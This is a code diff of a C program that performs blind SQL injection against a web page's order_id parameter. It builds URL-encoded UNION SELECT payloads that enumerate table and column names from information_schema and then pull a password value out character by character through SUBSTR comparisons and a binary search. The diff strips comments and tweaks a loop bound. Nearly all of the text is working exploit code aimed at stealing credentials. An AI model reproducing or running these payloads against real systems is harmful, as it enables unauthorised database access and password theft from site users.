@@ -248,9 +248,6 @@ bool check_table(const void *ctx) {
     return recv_empty(table_ctx->sockfd);
 }
 
-// Function 2: Find Column Name (ID or PWD)
-// No Backticks for table_name here! It is a comparison value in WHERE clause.
-// SQL: ... WHERE table_name = 'User Details' ...
 bool check_column(const void *ctx) {
     ColumnCtx *c_ctx = (ColumnCtx*)ctx;
     char mal_req[4096];
@@ -258,9 +255,9 @@ bool check_column(const void *ctx) {
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20column_name%%20"
         "FROM%%20information_schema.COLUMNS%%20"
-        "WHERE%%20LOWER%%28table_name%%29%%3dLOWER%%28%%27%s%%27%%29%%20" // %s = table_name (Literal! Must use %27 single quotes)
-        "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find (Literal)
-        "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered (Literal)
+        "WHERE%%20LOWER%%28table_name%%29%%3dLOWER%%28%%27%s%%27%%29%%20" // %s = table_name
+        "AND%%20column_name%%20LIKE%%20%%27%%25%s%%25%%27%%20" // %s = col_to_find
+        "AND%%20column_name%%20LIKE%%20%%27%s%%25%%27%%20" // %s = discovered
         "AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20"
         "LIMIT%%201;"
         " HTTP/1.1\r\n"
@@ -273,22 +270,20 @@ bool check_column(const void *ctx) {
     return recv_empty(c_ctx->gen_ctx.sockfd);
 }
 
-// Function 3: Extract Password Data
-// Backticks (%%60) ARE used here because we are using the names as Identifiers in FROM/SELECT/WHERE clauses.
 bool check_password(const void *ctx) {
     PwdCtx *d_ctx = (PwdCtx*)ctx;
     char mal_req[4096];
 
     const char *fmt =
         "GET /index.php?order_id=0%%20UNION%%20SELECT%%20"
-        "%%60%s%%60" // SELECT `pwd_col` (Identifier)
+        "%%60%s%%60" // SELECT `pwd_col`
         "%%20FROM%%20"
-        "%%60%s%%60" // FROM `table_name` (Identifier)
+        "%%60%s%%60" // FROM `table_name`
         "%%20WHERE%%20"
-        "%%60%s%%60" // WHERE `id_col` (Identifier)
+        "%%60%s%%60" // WHERE `id_col`
         "%%3d322695107%%20AND%%20"
         "%%60%s%%60" // AND `pwd_col`...
-        "%%20LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%' (Literal - No backticks)
+        "%%20LIKE%%20%%27%s%%25%%27%%20" // ...LIKE 'discovered%'
         "AND%%20SUBSTR("
         "%%60%s%%60" // SUBSTR(`pwd_col`...)
         ",%i,1)<%%3d%%27%s%%27%%20"
@@ -396,7 +391,7 @@ void binary_search(check_func_t check_fn, void *ctx) {
             printf("\t%s,%c,%c\n", gen_ctx->discovered, low + 0x20, high + 0x20);
         #endif
         }
-        if (low>=0x5f) {
+        if (low>0x5f) {
             #ifdef __MY_DEBUG__
                 puts("String shorter than max.");
             #endif
